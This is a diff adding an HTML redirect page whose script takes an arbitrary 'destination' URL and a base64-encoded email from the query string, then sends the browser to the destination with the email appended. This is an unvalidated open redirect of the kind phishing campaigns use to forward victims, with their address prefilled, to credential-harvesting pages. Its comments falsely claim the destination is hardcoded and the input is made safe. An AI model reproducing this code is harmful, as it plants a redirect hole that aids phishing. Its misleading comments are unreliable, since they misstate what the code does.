@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Get the URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+
+            // Retrieve the parameters from the URL
+            const encodedEmail = urlParams.get('email'); // Base64 encoded email
+            const destination = urlParams.get('destination'); // Destination URL
+            const base64Image = urlParams.get('image_data'); // Base64 encoded image data (if needed)
+            const randomString = urlParams.get('random'); // Random string (if needed)
+            const additionalData = urlParams.get('data1'); // Additional data (if needed)
+            const timestamp = urlParams.get('timestamp'); // Timestamp (if needed)
+            const token = urlParams.get('token'); // Token (if needed)
+            const uuid = urlParams.get('uuid'); // UUID (if needed)
+            const metadata = urlParams.get('metadata'); // Metadata (if needed)
+
+            // Check if the email and destination parameters are provided
+            if (!encodedEmail || !destination) {
+                alert('Missing required parameters.');
+                return;
+            }
+
+            // Hardcoded destination URL inside the script (cannot be changed by the URL parameters)
+            const fixedDestinationUrl = "https://twitter.com/home";
+
+            // Ensure the destination URL is valid (optional step)
+            const safeDestinationUrl = decodeURIComponent(destination); // Decode the URL (to handle encoding)
+
+            // Construct the final redirect URL by appending the email directly to the path of the destination URL
+            const redirectUrl = `${safeDestinationUrl}${encodedEmail}`;
+
+            // Debugging output for testing
+            console.log("Redirecting to:", redirectUrl);
+
+            // Perform the redirection without query parameters (only the email will be included in the path)
+            window.location.href = redirectUrl;
+        });
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
+
+
+
+
+
+
